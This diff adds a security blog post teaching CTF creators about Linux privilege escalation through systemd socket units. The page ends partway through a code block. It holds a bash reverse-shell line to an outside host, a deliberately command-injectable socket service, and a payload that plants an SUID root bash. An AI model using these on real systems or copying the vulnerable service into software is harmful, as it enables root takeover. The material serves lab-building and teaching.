@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - Sockets for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-sockets/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - Sockets for CTF Creators">
+  <meta property="og:description" content="Can I manipulate this sockets communications? (*-*)">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Sockets">
+    <meta property="article:tag" content="Socket Configuration Files">
+    <meta property="article:tag" content="Sockets Command Injection">
+    <meta property="article:tag" content="Defend">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - Sockets for CTF Creators">
+  <meta name="twitter:description" content="Can I manipulate this sockets communications? (*-*)">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-sockets/" /><link rel="prev" href="//localhost:1313/linux-privesc-ssh/" /><link rel="next" href="//localhost:1313/linux-privesc-so-injection/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - Sockets for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-sockets\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "privilege escalation, sockets, socket configuration files, sockets command injection, defend","wordcount":  984 ,
+        "url": "\/\/localhost:1313\/linux-privesc-sockets\/","datePublished": "2021-12-28T11:33:00+08:00","dateModified": "2021-12-28T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Sockets for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;984 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#sockets">Sockets</a></li>
+    <li><a href="#understanding-sockets">Understanding Sockets</a></li>
+    <li><a href="#privilegeescalation-via-writable-socket-files">PrivilegeEscalation via Writable .socket files</a></li>
+    <li><a href="#privilegeescalation-via-socket-command-injection">PrivilegeEscalation via Socket Command Injection</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="sockets">Sockets</h1>
+<p>A Unix-domain socket allows communication between two different processes on the same machine or different machines in client-server application frameworks. It facilitates inter-process communication using standard Unix file descriptors.</p>
+<p>Sockets can be configured using <code>.socket</code> files.</p>
+<p>For more information regarding sockets, refer to the <a href="https://www.man7.org/linux/man-pages/man5/systemd.socket.5.html" target="_blank" rel="noopener noreffer ">systemd.socket</a> man page. Information regarding special systemd units can be found on the <a href="https://www.man7.org/linux/man-pages/man7/systemd.special.7.html" target="_blank" rel="noopener noreffer ">systemd.special</a> man page.</p>
+<blockquote>
+<p>Note that <code>SOCK_SEQPACKET</code> (i.e. <code>ListenSequentialPacket=</code>) is only available for <code>AF_UNIX</code> sockets. <code>SOCK_STREAM</code> (i.e. <code>ListenStream=</code>) when used for IP sockets refers to TCP sockets, <code>SOCK_DGRAM</code> (i.e. <code>ListenDatagram=</code>) to UDP.</p>
+</blockquote>
+<h1 id="understanding-sockets">Understanding Sockets</h1>
+<p>Install socat with the <code>apt</code> package manager:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install socat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s create a socket file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /lib/systemd/system/echo.socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this case, we&rsquo;re going to create an echo socket and use only a listening directive and the <code>Accept</code> directive:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span> <span class="o">=</span> Echo server 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Socket<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">ListenStream</span> <span class="o">=</span> <span class="m">4444</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Accept</span> <span class="o">=</span> yes 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span> <span class="o">=</span> sockets.target
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Options:</p>
+<ul>
+<li>ListenStream: means <code>SOCK_STREAM</code> and when used for IP sockets refers to TCP sockets.</li>
+<li>Accept: Takes a boolean argument. If yes, a service instance is spawned for each incoming connection and only the connection socket is passed to it. If no, all listening sockets themselves are passed to the started service unit, and only one service unit is spawned for all connections. Since we want to send information from one machine to another, you will be using an <em>AF_INET</em>, and for that the best thing to do is have <code>Accept</code> set to <code>true</code> or <code>yes</code>.</li>
+<li>WantedBy=sockets.target:  A special target unit that sets up all socket units (see <a href="https://www.freedesktop.org/software/systemd/man/systemd.socket.html#" target="_blank" rel="noopener noreffer ">systemd.socket(5)</a> for details) that shall be active after boot. Services that can be socket-activated shall add <code>Wants=</code> dependencies to this unit for their socket unit during installation. This is best configured via a <code>WantedBy=sockets.target</code> in the socket unit&rsquo;s [Install] section.</li>
+</ul>
+<p>Create a service file. In most cases, the service will have the same name as the socket unit, except with an <em>@</em> and the <em>service</em> suffix. As your socket unit was <em>echo.socket</em>, your service will be <em>echo@.service</em>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/systemd/system/echo@.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The service itself is also pretty basic:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Echo server service 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/home/low/echo_write.py 
+</span></span><span class="line"><span class="cl"><span class="nv">StandardInput</span><span class="o">=</span>socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The service <code>Type</code> is <code>simple</code>, which is already the default, so there is no need to include it. <code>&quot;ExecStart</code>” points to the <em>echo_write.py</em> script you will see in a minute, and the <code>&quot;StandardInput&quot;</code> for said script comes from the socket set up by <em>echo.socket</em>.</p>
+<p>Let&rsquo;s see where python is located:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ which python
+</span></span><span class="line"><span class="cl">user@pwn:~$ which python3
+</span></span><span class="line"><span class="cl">/usr/bin/python3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vim echo_write.py 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The echo_write.py script is just three lines long:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This reads a line of text from <em>STDIN</em>, which, as you can see, is accessed through the socket. <code>'sys.stdin.readline().strip()</code>&rsquo; then removes all spaces from the beginning and end of the line and converts it to uppercase <code>.upper()</code>. It then transmits it back through the socket to the transmitting computer&rsquo;s terminal (<code>'sys.stdout.write([...])'</code>). This means that a user can connect to the socket on your receiving system, write a string, and have it repeated back in upper case.</p>
+<p>Add execution permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chmod +x echo_write.py 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Start the socket unit with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl start echo.socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <em>echo.socket</em> will automatically call <em>echo@.service</em> (which runs echo_write.py) each time someone tries to push a string to the server through port 4444.</p>
+<p>Now check that the port listening:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ss -tnlp <span class="p">|</span> grep <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">LISTEN   <span class="m">0</span>        <span class="m">4096</span>                   *:4444                *:*       
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To do that, on the sending computer, you can use a program like <a href="https://www.linux.com/news/socat-general-bidirectional-pipe-handler" target="_blank" rel="noopener noreffer "><em>socat</em></a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ socat - TCP:127.0.0.1:4444
+</span></span><span class="line"><span class="cl">hello
+</span></span><span class="line"><span class="cl">HELLO
+</span></span><span class="line"><span class="cl">$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilegeescalation-via-writable-socket-files">PrivilegeEscalation via Writable .socket files</h1>
+<p>Let&rsquo;s add write permissions for others:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo chmod o+w echo.socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we find a <strong>writable</strong> <code>.socket</code> file we can <strong>add</strong> at the beginning of the <code>[Socket]</code> section something like <code>ExecStartPre=/home/user/backdoor</code> and the backdoor will be executed before the socket is created. Therefore, we will <strong>probably need to wait until the machine is rebooted</strong> if we can&rsquo;t reboot the machine with our current user.</p>
+<p>Add a reverse shell to the script or any other malicious command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;&#39;</span><span class="c1">#!/bin/bash\n\nbash -i &gt;&amp; /dev/tcp/10.10.10.15/1234 0&gt;&amp;1&#39; &gt;&gt; /home/user/script.sh</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Edit the socket file and add a script that it will be executed before the listening sockets/FIFOs are created and bound, we can do this with the <code>ExecStartPre=</code> option:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span> <span class="o">=</span> Echo server 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Socket<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStartPre</span><span class="o">=</span>/home/user/script.sh
+</span></span><span class="line"><span class="cl"><span class="nv">ListenStream</span> <span class="o">=</span> <span class="m">4444</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Accept</span> <span class="o">=</span> yes 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span> <span class="o">=</span> sockets.target
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s restart the socket:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl restart echo.socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, we could restart the computer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Receive the reverse shell as the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilegeescalation-via-socket-command-injection">PrivilegeEscalation via Socket Command Injection</h1>
+<p>Create a file named <code>socket_injection.py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vim socket_injection.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Write the following code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter a command: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add execution permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chmod +x socket_injection.py 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create the following socket:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /lib/systemd/system/injection.socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Write the following configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span> <span class="o">=</span> Socket Command Injection Server 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Socket<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">ListenSequentialPacket</span> <span class="o">=</span> <span class="m">1234</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Accept</span> <span class="o">=</span> yes 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span> <span class="o">=</span> sockets.target
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then create this service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/systemd/system/injection@.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Write the following instructions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Vulnerable Socket Command Injection Service 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/home/user/socket_injection.py 
+</span></span><span class="line"><span class="cl"><span class="nv">StandardInput</span><span class="o">=</span>socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now start the socket:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl start injection.socket
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check if the port is listening:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ss -tnlp <span class="p">|</span> grep <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">LISTEN   <span class="m">0</span>        <span class="m">4096</span>                   *:1234                *:*    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run the following commands:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ <span class="nb">echo</span> <span class="s2">&#34;cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;&#34;</span> <span class="p">|</span> socat - TCP:127.0.0.1:1234
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:~$ ls -l /tmp/bash
+</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root <span class="m">1037528</span> Nov <span class="m">15</span> 15:41 /tmp/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Spawn bash with SUID and print the Effective UID:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
